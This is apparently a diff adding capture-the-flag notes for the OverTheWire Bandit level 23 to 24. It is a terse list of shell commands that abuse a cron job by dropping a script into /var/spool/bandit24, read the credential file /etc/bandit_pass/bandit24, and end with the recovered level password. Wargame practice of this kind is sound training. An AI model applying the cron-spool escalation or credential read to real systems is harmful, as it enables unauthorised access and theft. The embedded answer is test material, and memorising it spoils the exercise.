@@ -1,0 +1,23 @@
+ssh -p 2220 bandit23@bandit.labs.overthewire.org
+
+ls /etc/cron.d/
+
+cat /etc/cron.d/cronjob_bandit24
+
+cat /usr/bin/cronjob_bandit24.sh
+
+mkdir /tmp/rand
+
+cd /tmp/rand
+
+cat /etc/bandit_pass/bandit24 > /tmp/rand/password
+
+touch password
+
+chmod 777 -R /tmp/rand
+
+cp script.sh /var/spool/bandit24
+
+cat password 
+
+mdp=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
